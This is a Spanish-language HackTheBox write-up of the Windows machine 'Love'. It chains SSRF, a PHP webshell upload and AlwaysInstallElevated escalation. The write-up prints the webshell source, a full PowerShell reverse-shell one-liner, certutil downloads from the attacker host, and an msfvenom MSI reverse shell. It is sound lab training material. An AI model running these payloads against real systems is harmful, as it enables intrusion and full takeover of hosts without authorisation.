---
layout: post
render_with_liquid: false
title: "HTB Writeup: Love"
date: 2026-05-07
category: writeups
tags: [htb, windows, easy, ssrf, vhost, voting-system, file-upload, webshell, powershell, alwaysinstallelevated, msi, msiexec, msfvenom, privesccheck]
platform: HackTheBox
os: Windows
difficulty: Easy
has_exploits: false
resumen: "Cadena Windows que parte de un vhost staging.love.htb con un Free File Scanner vulnerable a SSRF, lo aprovecha contra el servicio interno del puerto 5000 para extraer las credenciales del Voting System (admin:@LoveIsInTheAir!!!!), sube una webshell PHP como foto de candidato para RCE como love\\phoebe y escala a SYSTEM mediante AlwaysInstallElevated con un MSI generado con msfvenom y lanzado vía msiexec /quiet /qn /i."
permalink: /writeups/love/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Windows    |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

## Sinopsis

**Love** es una máquina Windows de dificultad **Easy** cuyo recorrido encadena: **enumeración de virtual hosts**, **SSRF para tocar un servicio interno bloqueado** y **escalada de privilegios por `AlwaysInstallElevated`**.

`nmap` revela una superficie típica de Windows con servicios web (`80`, `443`, `5000`), SMB, MariaDB, WinRM, RPC y un panel **Webmin/MiniServ** en `10000`. La home de `love.htb` sirve un **Voting System** en PHP con un panel `/admin/` que diferencia entre *user not found* y *incorrect password* — útil para confirmar que el usuario `admin` existe, pero por sí solo no da acceso. El certificado TLS del `443` filtra el **vhost `staging.love.htb`**, confirmado luego con `gobuster vhost --append-domain`. En `staging.love.htb/beta.php` aparece un **Free File Scanner** que pide una URL para escanear: el caso de libro de **SSRF**. Apuntando a `http://localhost:5000` (el propio servicio interno bloqueado al exterior por `403`), el server devuelve un *Password Dashboard* con las credenciales `admin:@LoveIsInTheAir!!!!`.

Con esas credenciales entramos al **Voting System**, abusamos del formulario **Add New Candidate** para subir `simple-backdoor.php` en el campo **Photo** y obtenemos RCE como **`love\phoebe`** servida en `/images/`. Disparamos una *PowerShell reverse shell* (TCPClient + `iex`) URL-encoded contra nuestro listener y leemos `C:\Users\Phoebe\Desktop\user.txt`. El script **PrivescCheck** detecta `MSI AlwaysInstallElevated` con severidad alta. Generamos `shell.msi` con `msfvenom`, lo descargamos en la víctima con `certutil -urlcache` y lo ejecutamos con `msiexec /quiet /qn /i`. El servicio MSI corre como **`nt authority\system`** y nos devuelve shell como SYSTEM, dejándonos a un `type C:\Users\Administrator\Desktop\root.txt` de la flag final.

---

## Reconocimiento

### Escaneo de puertos

Lanzamos un SYN completo sobre los 65535 puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.48.103 -oG allPorts
```

| Parámetro         | Descripción                                              |
| :---------------- | :------------------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP                            |
| `--open`          | Muestra únicamente los puertos abiertos                  |
| `-sS`             | SYN Scan (half-open, más rápido y sigiloso)              |
| `--min-rate 5000` | Envía mínimo 5000 paquetes por segundo                   |
| `-vvv`            | Máxima verbosidad durante el escaneo                     |
| `-n`              | Desactiva la resolución DNS                              |
| `-Pn`             | No realiza descubrimiento de host (asume que está activo)|
| `-oG allPorts`    | Exporta los resultados en formato grepeable              |

![nmap full ports — 80, 135, 139, 443, 445, 3306, 5000, 5040, 5985, 5986, 7680, 47001 + bloque RPC](/writeups/love/assets/01_nmap_full_ports.png)

Resultado:

| Puerto      | Servicio              |
| :---------- | :-------------------- |
| `80/tcp`    | HTTP                  |
| `135/tcp`   | MSRPC                 |
| `139/tcp`   | NetBIOS-SSN           |
| `443/tcp`   | HTTPS                 |
| `445/tcp`   | SMB (Microsoft-DS)    |
| `3306/tcp`  | MySQL / MariaDB       |
| `5000/tcp`  | HTTP (UPnP / interno) |
| `5040/tcp`  | desconocido           |
| `5985/5986` | WinRM (HTTP/HTTPS)    |
| `7680/tcp`  | pando-pub             |
| `47001/tcp` | WinRM                 |
| `49664-49670` | RPC dinámicos       |

### Detección de versiones

```bash
sudo nmap -sCV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001 10.129.48.103 -oN targeted
```

![nmap -sCV — Apache 2.4.46 PHP 7.3.27, Voting System, ssl-cert staging.love.htb / ValentineCorp, MariaDB 10.3.24](/writeups/love/assets/02_nmap_versions.png)

Lo relevante:

- **80/tcp** — Apache 2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 — `Voting System using PHP`
- **443/tcp** — Apache 2.4.46 con `ssl-cert: commonName=staging.love.htb / organizationName=ValentineCorp` → **filtra el vhost**
- **445/tcp** — Windows 10 Pro 19042 microsoft-ds
- **3306/tcp** — MariaDB 10.3.24 o superior
- **5000/tcp** — Apache 2.4.46 devolviendo `403 Forbidden` desde fuera (clave para el SSRF posterior)
- **5985/5986** — WinRM
- **`Service Info: Hosts: www.example.com, LOVE, www.love.htb`**

![nmap completando — Computer name: Love / NetBIOS LOVE / Workgroup WORKGROUP / Windows 10 Pro 19042 / message_signing disabled](/writeups/love/assets/03_nmap_smb_info.png)

```text
Computer name: Love
NetBIOS computer name: LOVE
Workgroup: WORKGROUP
OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
message_signing: disabled (dangerous, but default)
```

> El `ssl-cert` del 443 nos da el vhost antes incluso de lanzar `gobuster vhost`. Conviene mirar siempre el certificado de cualquier puerto TLS abierto.

### SMB sin credenciales

Probamos sesión nula:

```bash
rpcclient -U "" -N 10.129.48.103
```

![rpcclient con sesión nula — Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED](/writeups/love/assets/04_rpcclient_denied.png)

```text
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

SMB no nos da vector directo sin credenciales. Lo confirmamos con el `nmap` específico:

```bash
sudo nmap -sVC -p139,445 10.129.48.103 -oG SMB
```

![nmap SMB — Windows 10 Pro 19042, NetBIOS LOVE, Workgroup WORKGROUP, message_signing disabled](/writeups/love/assets/05_smb_versions.png)

---

## Enumeración web

### `love.htb` — Voting System

Antes de fuzzear añadimos el dominio principal y el vhost al `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.48.103 love.htb staging.love.htb" >> /etc/hosts'
```

`gobuster` sobre la home muestra la estructura clásica de la app:

```bash
sudo gobuster dir -u http://love.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt,asp,aspx,config,bak,old,zip -b 404,403 -t 50
```

![gobuster love.htb — admin, includes, images, plugins, login.php, index.php, tcpdf, preview.php](/writeups/love/assets/06_gobuster_lovehtb.png)

| Ruta            | Notas                                              |
| :-------------- | :------------------------------------------------- |
| `/admin/`       | Panel administrativo del Voting System             |
| `/includes/`    | Librerías y configuración interna                  |
| `/images/`      | **Directorio de uploads** — relevante después      |
| `/plugins/`     | Recursos de la app                                 |
| `/tcpdf/`       | Librería para generación de PDF                    |
| `/login.php`    | Redirige a `/index.php` si no hay sesión           |
| `/preview.php`  | Endpoint reservado para sesiones autenticadas      |

### Enumeración de usuarios por mensajes diferenciados

El login del panel `/admin/` distingue entre usuario que no existe y password incorrecta:

![Login con admin / pass aleatoria — "Incorrect password"](/writeups/love/assets/07_login_admin_incorrect.png)

![Login con admin999999s — "Cannot find account with the username"](/writeups/love/assets/08_login_user_unknown.png)

| Usuario probado     | Mensaje                                          | Conclusión           |
| :------------------ | :----------------------------------------------- | :------------------- |
| `admin`             | `Incorrect password`                             | El usuario **existe** |
| `admin999999s`      | `Cannot find account with the username`          | El usuario **no existe** |

Confirmamos que `admin` es válido. Falta la contraseña — por aquí no entraremos sin más datos, pero el hallazgo nos sirve más adelante.

### Vhost `staging.love.htb`

El certificado del 443 ya filtraba el vhost; lo confirmamos por fuerza bruta:

```bash
sudo gobuster vhost -u http://love.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

![gobuster vhost — staging.love.htb Status 200 Size 5357](/writeups/love/assets/09_gobuster_vhost.png)

Visitamos el vhost — aparece un **Free File Scanner**:

![staging.love.htb landing — Free File Scanner / FFS will scan your files for recognized malware signatures](/writeups/love/assets/10_staging_landing.png)

Fuzzeamos rutas dentro del vhost:

```bash
sudo gobuster dir -u http://staging.love.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt,asp,aspx,config,bak,old,zip -b 404,403 -t 50
```

![gobuster staging — index.php y beta.php](/writeups/love/assets/11_gobuster_staging.png)

`beta.php` es el endpoint funcional:

![beta.php — Specify the file url + Scan file](/writeups/love/assets/12_betaphp_form.png)

> Una funcionalidad que recibe una **URL del usuario y la solicita server-side** es siempre el primer sospechoso para SSRF. Aquí ni siquiera hay que adivinar el patrón — el formulario lo dice literalmente: `Specify the file url`.

---

## Foothold — SSRF a `localhost:5000`

### El servicio interno bloqueado

`nmap` mostraba `5000/tcp` abierto, pero desde nuestra máquina devuelve `403 Forbidden`. Es decir: el server escucha pero **filtra peticiones externas**. Sin embargo, una petición que **salga del propio host** (`localhost`) sí puede alcanzarlo.

`beta.php` actúa como proxy: el server hace la *fetch* en nuestro nombre y el `403` no se aplica porque la petición viene del loopback. Apuntamos al puerto interno:

```text
http://localhost:5000
```

![beta.php enviando http://localhost:5000 — petición SSRF preparada](/writeups/love/assets/13_ssrf_localhost5000.png)

La respuesta del server interno aparece reflejada bajo el formulario:

![Password Dashboard / Voting system Administration / Vote Admin Creds admin: @LoveIsInTheAir!!!!](/writeups/love/assets/14_ssrf_creds.png)

```text
Voting system Administration
Vote Admin Creds  admin: @LoveIsInTheAir!!!!
```

Credenciales del Voting System reveladas: **`admin : @LoveIsInTheAir!!!!`**.

| Pieza                          | Función                                                                          |
| :----------------------------- | :------------------------------------------------------------------------------- |
| `staging.love.htb/beta.php`    | Frontend que recibe la URL y la solicita server-side                             |
| `http://localhost:5000`        | Servicio interno con un *Password Dashboard* de credenciales del Voting System   |
| `403` desde fuera, `200` desde dentro | Filtro de acceso por origen — neutralizado por el SSRF                       |

### Acceso al panel administrativo

Reutilizamos las credenciales en `/admin/`:

![VotingSystem dashboard — Neovic Devierte Online + Dashboard con 0 positions/candidates](/writeups/love/assets/15_admin_dashboard.png)

Sesión iniciada como `admin` (perfil `Neovic Devierte`). El panel ofrece secciones para **Voters**, **Positions**, **Candidates**, **Ballot Position** y **Election Title**.

---

## RCE — Webshell PHP por upload de "Photo"

### Subida del backdoor como foto de candidato

El **Voting System** de SourceCodeSter es vulnerable a *unrestricted file upload* en el formulario de candidatos: el campo **Photo** acepta cualquier extensión, incluyendo `.php`. Subimos `simple-backdoor.php` como foto:

```php
<?php
// Simple PHP backdoor by DK (http://michaeldaw.org)
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

![Add New Candidate — Photo: simple-backdoor.php seleccionado](/writeups/love/assets/16_add_candidate_upload.png)

Tras guardar, el fichero queda servido directamente bajo `/images/`:

![Acceso a /images/simple-backdoor.php — devuelve "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd"](/writeups/love/assets/17_backdoor_uploaded.png)

La aplicación renombra ficheros a veces, pero aquí el nombre original se conserva. Lo que importa es que **la URL pública termina en `.php` y Apache la procesa como tal**.

### Confirmación de ejecución

```http
GET /images/simple-backdoor.php?cmd=hostname HTTP/1.1
Host: love.htb
```

![view-source de la respuesta — <pre>Love</pre>](/writeups/love/assets/18_cmd_hostname.png)

```http
GET /images/simple-backdoor.php?cmd=whoami HTTP/1.1
Host: love.htb
```

![Burp Repeater — cmd=whoami devuelve <pre>love\phoebe</pre>](/writeups/love/assets/19_cmd_whoami.png)

```text
love\phoebe
```

Tenemos **RCE como `love\phoebe`** desde un simple GET.

### Reverse shell PowerShell

Listener:

```bash
nc -nlvp 7777
```

Payload PowerShell *one-liner* clásico (TCPClient + lectura/escritura por stream con `iex`), URL-encoded para meterlo entero en el `?cmd=`:

```powershell
powershell -NoP -W Hidden -c "$client=New-Object System.Net.Sockets.TCPClient('10.10.15.178',7777);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"
```

![Burp Repeater — GET /images/simple-backdoor.php?cmd=powershell+-NoP+-W+Hidden+-c+%22%24client%3D... (PS reverse shell URL-encoded)](/writeups/love/assets/20_revshell_request.png)

| Flag PowerShell  | Función                                              |
| :--------------- | :--------------------------------------------------- |
| `-NoP`           | `-NoProfile` — no carga el perfil del usuario        |
| `-W Hidden`      | `-WindowStyle Hidden` — sin ventana visible          |
| `-c "..."`       | Comando inline                                       |
| `iex $data`      | `Invoke-Expression` sobre el comando recibido        |

Conexión recibida:

![nc — Connection received on 10.129.40.188; ls revela C:\xampp\htdocs\omrs\images con simple-backdoor.php](/writeups/love/assets/21_revshell_received.png)

```text
Connection received on 10.129.40.188 61536
PS C:\xampp\htdocs\omrs\images>
```

### Flag de usuario

```powershell
cat C:\Users\Phoebe\Desktop\user.txt
```

![cat user.txt — 88f77552b2b47588452b6d789cf5d004](/writeups/love/assets/22_user_txt.png)

**Flag de usuario** en `C:\Users\Phoebe\Desktop\user.txt`.

---

## Privilege Escalation — `AlwaysInstallElevated`

### Enumeración local con PrivescCheck

Subimos `PrivescCheck.ps1` con `certutil -urlcache` y lo lanzamos *bypass policy*:

```powershell
cd C:\Tmp
certutil -urlcache -f http://10.10.15.178:8000/PrivescCheck.ps1 PrivescCheck.ps1
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

![PrivescCheck — User: LOVE\Phoebe, IntegrityLevel Medium, grupos BUILTIN\Remote Management Users + BUILTIN\Users + NT AUTHORITY\INTERACTIVE](/writeups/love/assets/23_privesccheck_user.png)

```text
Name           : LOVE\Phoebe
IntegrityLevel : Medium Mandatory Level
Groups:
  BUILTIN\Remote Management Users   S-1-5-32-580
  BUILTIN\Users                     S-1-5-32-545
  NT AUTHORITY\INTERACTIVE
```

`Phoebe` está en `Remote Management Users` (puede entrar por WinRM con sus credenciales si las tuviéramos), pero no es Administrator. PrivescCheck imprime el resumen al final:

![PrivescCheck Summary — TA0004 Privilege Escalation: MSI AlwaysInstallElevated High](/writeups/love/assets/24_privesccheck_summary.png)

```text
~~~ PrivescCheck Summary ~~~
TA0001 - Initial Access
  - Hardening - BitLocker             Low
TA0004 - Privilege Escalation
  - Configuration - MSI AlwaysInstallElevated   High
  - Updates - Update History          Medium
TA0006 - Credential Access
  - Hardening - Credential Guard      Low
  - Hardening - LSA Protection        Low
```

**`MSI AlwaysInstallElevated`** marcado como severidad **High** — es el camino.

### Qué es `AlwaysInstallElevated`

Cuando estas dos claves del registro están a `1`, **cualquier paquete MSI ejecutado por un usuario sin privilegios se instala con privilegios `SYSTEM`** (es una concesión histórica de Windows Installer pensada para entornos corporativos). Las claves son:

```text
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
```

Comprobación manual (opcional, ya confirmada por PrivescCheck):

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Generación del MSI con `msfvenom`

Generamos un MSI con un `windows/x64/shell_reverse_tcp` en bruto:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.178 LPORT=7779 -f msi -o shell.msi
```

```text
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

Servimos el binario:

```bash
python3 -m http.server 8000
nc -nlvp 7779
```

### Descarga y ejecución como SYSTEM

En la víctima descargamos con `certutil` y disparamos con `msiexec`:

```powershell
certutil -urlcache -f http://10.10.15.178:8000/shell.msi C:\Tmp\shell.msi
msiexec /quiet /qn /i C:\Tmp\shell.msi
```

| Flag `msiexec`  | Función                                                          |
| :-------------- | :--------------------------------------------------------------- |
| `/i`            | Install — la operación principal                                  |
| `/quiet`        | Sin interacción de usuario                                        |
| `/qn`           | UI mode "no UI" (refuerza `/quiet` evitando popups MSI)           |

![Msiexec ejecuta shell.msi y nc en 7779 recibe nueva conexión como nt authority\system](/writeups/love/assets/25_msi_system.png)

En el listener:

```text
Connection received on 10.129.40.188 49744
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.
C:\WINDOWS\system32>whoami
nt authority\system
```

**`nt authority\system`** confirmada.

### Flag de root

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

![type root.txt — 98e60b70ae3b70fd47ebc94070aeff8c](/writeups/love/assets/26_root_txt.png)

**Flag de root** en `C:\Users\Administrator\Desktop\root.txt`.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados como los laboratorios de HackTheBox, TryHackMe o entornos propios. El uso de estas técnicas contra infraestructura sin permiso explícito es ilegal.
